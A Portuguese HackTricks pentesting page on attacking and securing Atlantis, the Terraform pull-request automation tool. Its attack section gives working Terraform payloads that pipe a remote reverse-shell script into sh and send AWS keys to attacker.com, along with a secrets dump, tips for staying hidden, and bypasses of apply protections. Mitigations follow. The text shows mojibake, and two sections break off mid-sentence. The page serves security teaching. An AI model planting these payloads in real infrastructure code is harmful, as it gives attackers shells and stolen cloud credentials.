# Seguran√ßa do Atlantis

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **reposit√≥rios do github.**

</details>

## Informa√ß√µes b√°sicas

O Atlantis basicamente ajuda voc√™ a executar o terraform a partir de Pull Requests do seu servidor git.

![](<../.gitbook/assets/image (51).png>)

## Laborat√≥rio local

1. Acesse a **p√°gina de lan√ßamentos do atlantis** em [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) e **baixe** a vers√£o que lhe conv√©m.
2. Crie um **token pessoal** (com acesso ao reposit√≥rio) do seu usu√°rio **github**
3. Execute `./atlantis testdrive` e ele criar√° um **reposit√≥rio de demonstra√ß√£o** que voc√™ pode usar para **conversar com o atlantis**
   1. Voc√™ pode acessar a p√°gina da web em 127.0.0.1:4141

## Acesso ao Atlantis

### Credenciais do servidor Git

O **Atlantis** suporta v√°rios hosts git, como **Github**, **Gitlab**, **Bitbucket** e **Azure DevOps**.\
No entanto, para acessar os reposit√≥rios nessas plataformas e executar a√ß√µes, √© necess√°rio ter algum **acesso privilegiado concedido a eles** (pelo menos permiss√µes de grava√ß√£o).\
[**A documenta√ß√£o**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) incentiva a criar um usu√°rio nessas plataformas especificamente para o Atlantis, mas algumas pessoas podem usar contas pessoais.

{% hint style="warning" %}
Em qualquer caso, do ponto de vista de um atacante, a **conta Atlantis** ser√° muito **interessante** **para comprometer**.
{% endhint %}

### Webhooks

O Atlantis usa opcionalmente [**segredos de webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que os **webhooks** que recebe do seu host Git s√£o **leg√≠timos**.

Uma maneira de confirmar isso seria **permitir que as solicita√ß√µes venham apenas dos IPs** do seu host Git, mas uma maneira mais f√°cil √© usar um Webhook Secret.

Observe que, a menos que voc√™ use um servidor github ou bitbucket privado, ser√° necess√°rio expor os pontos de extremidade do webhook para a Internet.

{% hint style="warning" %}
O Atlantis estar√° **expondo webhooks** para que o servidor git possa enviar informa√ß√µes. Do ponto de vista de um atacante, seria interessante saber **se voc√™ pode enviar mensagens**.
{% endhint %}

### Credenciais do provedor <a href="#provider-credentials" id="provider-credentials"></a>

O Atlantis executa o Terraform simplesmente **executando os comandos `terraform plan` e `apply`** no servidor em que o Atlantis est√° hospedado. Assim como quando voc√™ executa o Terraform localmente, o Atlantis precisa de credenciais para o seu provedor espec√≠fico.

Depende de voc√™ como [fornecer credenciais](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para o seu provedor espec√≠fico para o Atlantis:

* O [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) do Atlantis e o [M√≥dulo AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) t√™m seus pr√≥prios mecanismos para credenciais do provedor. Leia a documenta√ß√£o deles.
* Se voc√™ estiver executando o Atlantis em uma nuvem, muitas nuvens t√™m maneiras de fornecer acesso √† API da nuvem para aplicativos em execu√ß√£o nelas, ex:
  * [Fun√ß√µes AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Pesquise por "Fun√ß√£o EC2")
  * [Contas de servi√ßo de inst√¢ncia GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Muitos usu√°rios definem vari√°veis de ambiente, ex. `AWS_ACCESS_KEY`, onde o Atlantis est√° sendo executado.
* Outros criam os arquivos de configura√ß√£o necess√°rios, ex. `~/.aws/credentials`, onde o Atlantis est√° sendo executado.
* Use o [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obter credenciais do provedor.

{% hint style="warning" %}
O **cont√™iner** em que o **Atlantis** est√° **executando** provavelmente **conter√° credenciais privilegiadas** para os provedores (AWS, GCP, Github...) que o Atlantis est√° gerenciando via Terraform.
{% endhint %}

### P√°gina da web

Por padr√£o, o Atlantis executar√° uma **p√°gina da web na porta 4141 em localhost**. Esta p√°gina apenas permite que voc√™ habilite / desabilite a aplica√ß√£o do atlantis e verifique o status do plano dos reposit√≥rios e desbloqueie-os (n√£o permite modificar coisas, portanto, n√£o √© t√£o √∫til).

Provavelmente voc√™ n√£o encontrar√° isso exposto na Internet, mas parece que por padr√£o **n√£o s√£o necess√°rias credenciais** para acess√°-lo (e se forem, `atlantis`:`atlantis` s√£o os **padr√µes**).

## Configura√ß√£o do servidor

A configura√ß√£o do `atlantis server` pode ser especificada por meio de flags de linha de comando, vari√°veis de ambiente, um arquivo de configura√ß√£o ou uma combina√ß√£o dos tr√™s.

* Voc√™ pode encontrar [**aqui a lista de flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) suportados pelo servidor Atlantis
* Voc√™ pode encontrar [**aqui como transformar uma op√ß√£o de configura√ß√£o em uma vari√°vel de ambiente**](https://www.runatlantis.io/docs/server-configuration.html
## Comandos do Atlantis

[**Na documenta√ß√£o**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) voc√™ pode encontrar as op√ß√µes que voc√™ pode usar para executar o Atlantis:

```bash
# Obter ajuda
atlantis help

# Executar o terraform plan
atlantis plan [options] -- [terraform plan flags]
##Op√ß√µes:
## -d diret√≥rio
## -p projeto
## --verbose
## Voc√™ tamb√©m pode adicionar op√ß√µes extras do terraform

# Executar o terraform apply
atlantis apply [options] -- [terraform apply flags]
##Op√ß√µes:
## -d diret√≥rio
## -p projeto
## -w workspace
## --auto-merge-disabled
## --verbose
## Voc√™ tamb√©m pode adicionar op√ß√µes extras do terraform 
```

## Ataques

{% hint style="warning" %}
Se durante a explora√ß√£o voc√™ encontrar este **erro**: `Error: Error acquiring the state lock`

Voc√™ pode corrigi-lo executando:

```
atlantis unlock #Voc√™ pode precisar executar isso em um PR diferente
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Modifica√ß√£o de configura√ß√£o em novo PR

Se voc√™ tem acesso de escrita a um reposit√≥rio, voc√™ ser√° capaz de criar um novo branch nele e gerar um PR. Se voc√™ pode **executar `atlantis plan`** (ou talvez seja executado automaticamente) **voc√™ ser√° capaz de RCE dentro do servidor Atlantis**.

Voc√™ pode fazer isso fazendo [**Atlantis carregar uma fonte de dados externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Basta colocar um payload como o seguinte no arquivo `main.tf`:

```json
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Ataque mais furtivo

Voc√™ pode realizar este ataque de uma forma ainda mais **furtiva**, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que contenha o rev shell:

```javascript
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

Voc√™ pode encontrar o c√≥digo do rev shell em [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo do terraform rev shell em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Em vez** de criar um **PR para o master** para acionar o Atlantis, **crie 2 branches** (test1 e test2) e crie um **PR de um para o outro**. Quando voc√™ completar o ataque, basta **remover o PR e os branches**.

### Atlantis plan Secrets Dump

Voc√™ pode **dump secrets usados pelo terraform** executando `atlantis plan` (`terraform plan`) colocando algo como isto no arquivo terraform:

```json
output "dotoken" {
  value = nonsensitive(var.do_token)
}
```

### Atlantis apply RCE - Modifica√ß√£o de configura√ß√£o em novo PR

Se voc√™ tem acesso de escrita a um reposit√≥rio, voc√™ ser√° capaz de criar um novo branch nele e gerar um PR. Se voc√™ pode **executar `atlantis apply` voc√™ ser√° capaz de RCE dentro do servidor Atlantis**.

No entanto, voc√™ geralmente precisar√° contornar algumas prote√ß√µes:

* **Mergeable**: Se esta prote√ß√£o estiver definida no Atlantis, voc√™ s√≥ pode executar **`atlantis apply` se o PR for mescl√°vel** (o que significa que a prote√ß√£o do branch precisa ser contornada).
  * Verifique poss√≠veis [**bypasses de prote√ß√µes de branch**](broken-reference/)
* **Aprovado**: Se esta prote√ß√£o estiver definida no Atlantis, algum **outro usu√°rio deve aprovar o PR** antes que voc√™ possa executar `atlantis apply`
  * Por padr√£o, voc√™ pode abusar do [**token Gitbot para contornar esta prote√ß√£o**](broken-reference/)

Executando **`terraform apply` em um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa ter certeza de que algum payload como os seguintes termina no arquivo `main.tf`:

```json
// Payload 1 para apenas roubar um segredo
resource "null_resource" "secret_stealer" {
  provisioner "local-exec" {
    command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
  }
}

// Payload 2 para obter um rev shell
resource "null_resource" "rev_shell" {
  provisioner "local-exec" {
    command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
  }
}
```

Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de uma forma mais **furtiva**.

### Terraform Param Injection

Ao executar `atlantis plan` ou `atlantis apply`, o terraform est√° sendo executado por baixo, voc√™ pode passar comandos para o terraform a partir do atlantis comentando algo como:

```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Obter ajuda do terraform plan

atlantis apply -- <terraform commands>
atlantis apply -- -h #Obter ajuda do terraform apply
```

Algo que voc√™ pode passar s√£o vari√°veis de ambiente que podem ser √∫teis para contornar algumas prote√ß√µes. Verifique as vari√°veis de ambiente do terraform em [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Fluxo de trabalho personalizado

Executando **comandos de compila√ß√£o personalizados maliciosos** especificados em um arquivo `atlantis.yaml`. O Atlantis usa o arquivo `atlantis.yaml` do branch do pull request, **n√£o** do `master`.\
Esta possibilidade foi mencionada em uma se√ß√£o anterior:

{% hint style="danger" %}
Se a flag [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` estiver definida como **True**, fluxos de trabalho podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m √© potencialmente necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **substituir o fluxo de trabalho** que ser√° usado.

Isso basicamente dar√° **RCE no servidor Atlantis para qualquer usu√°rio que possa acessar esse reposit√≥rio**.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
  workflow: custom1
workflows:
  custom1:
    plan:
      steps:
      - init
      - run: my custom plan command
    apply:
      steps:
      - run: my custom apply command
```
{% endhint %}

### Bypass de prote√ß√µes de plan/apply

Se a flag [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiver_ `apply_requirements` configurado, √© poss√≠vel para um reposit√≥rio **modificar as prote√ß√µes de plan/apply para contorn√°-las**.

```yaml
repos:
- id: /.*/
  apply_requirements: []
```

### Sequestro de PR

Se algu√©m enviar **coment√°rios `atlantis plan/apply` em seus pull requests v√°lidos,** isso far√° com que o terraform seja executado quando voc√™ n√£o quiser.

Al√©m disso, se voc√™ n√£o tiver configurado na **prote√ß√£o de branch** para
## Mitiga√ß√µes

### N√£o use em reposit√≥rios p√∫blicos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Porque qualquer pessoa pode comentar em pull requests p√∫blicos, mesmo com todas as mitiga√ß√µes de seguran√ßa dispon√≠veis, ainda √© perigoso executar o Atlantis em reposit√≥rios p√∫blicos sem a configura√ß√£o adequada das configura√ß√µes de seguran√ßa.

### N√£o use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Se voc√™ estiver executando em um reposit√≥rio p√∫blico (o que n√£o √© recomendado, veja acima), voc√™ n√£o deve definir `--allow-fork-prs` (padr√£o √© falso) porque qualquer pessoa pode abrir um pull request do seu fork para o seu reposit√≥rio.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

O Atlantis requer que voc√™ especifique uma lista de permiss√µes de reposit√≥rios que aceitar√° webhooks via a flag `--repo-allowlist`. Por exemplo:

* Reposit√≥rios espec√≠ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toda a sua organiza√ß√£o: `--repo-allowlist=github.com/runatlantis/*`
* Todos os reposit√≥rios em sua instala√ß√£o do GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Todos os reposit√≥rios: `--repo-allowlist=*`. √ötil quando voc√™ est√° em uma rede protegida, mas perigoso sem definir tamb√©m um segredo de webhook.

Esta flag garante que sua instala√ß√£o do Atlantis n√£o esteja sendo usada com reposit√≥rios que voc√™ n√£o controla. Veja `atlantis server --help` para mais detalhes.

### Proteja o planejamento do Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Se atacantes enviarem pull requests com c√≥digo Terraform malicioso em seu modelo de amea√ßa, voc√™ deve estar ciente de que as aprova√ß√µes de `terraform apply` n√£o s√£o suficientes. √â poss√≠vel executar c√≥digo malicioso em um `terraform plan` usando o [data source `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou especificando um provedor malicioso. Este c√≥digo poderia ent√£o exfiltrar suas credenciais.

Para evitar isso, voc√™ poderia:

1. Incorporar provedores na imagem do Atlantis ou no host e negar a sa√≠da em produ√ß√£o.
2. Implementar o protocolo do registro de provedores internamente e negar a sa√≠da p√∫blica, dessa forma voc√™ controla quem tem acesso de escrita ao registro.
3. Modificar a etapa `plan` da configura√ß√£o do reposit√≥rio do lado do servidor para validar o uso de provedores ou fontes de dados n√£o permitidos ou PRs de usu√°rios n√£o permitidos. Voc√™ tamb√©m pode adicionar valida√ß√£o extra neste ponto, por exemplo, exigindo um "polegar para cima" no PR antes de permitir que o `plan` continue. Conftest pode ser √∫til aqui.

### Segredos de webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

O Atlantis deve ser executado com segredos de webhook definidos via as vari√°veis de ambiente `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Mesmo com a flag `--repo-allowlist` definida, sem um segredo de webhook, atacantes podem fazer solicita√ß√µes ao Atlantis se passando por um reposit√≥rio que est√° na lista de permiss√µes. Segredos de webhook garantem que as solicita√ß√µes de webhook realmente venham do seu provedor de VCS (GitHub ou GitLab).

Se voc√™ estiver usando o Azure DevOps, em vez de segredos de webhook, adicione um nome de usu√°rio e senha b√°sicos.

### Autentica√ß√£o b√°sica do Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

O Azure DevOps suporta o envio de um cabe√ßalho de autentica√ß√£o b√°sica em todos os eventos de webhook. Isso requer o uso de uma URL HTTPS para o local do webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Se voc√™ estiver usando segredos de webhook, mas seu tr√°fego estiver sobre HTTP, ent√£o os segredos de webhook podem ser roubados. Habilite SSL/HTTPS usando as flags `--ssl-cert-file` e `--ssl-key-file`.

### Habilitar autentica√ß√£o no servidor web do Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

√â altamente recomendado habilitar a autentica√ß√£o no servi√ßo web. Habilite o BasicAuth usando a flag `--web-basic-auth=true` e configure um nome de usu√°rio e uma senha usando as flags `--web-username=yourUsername` e `--web-password=yourPassword`.

Voc√™ tamb√©m pode passar essas informa√ß√µes como vari√°veis de ambiente `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` e `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Refer√™ncias

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga** me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>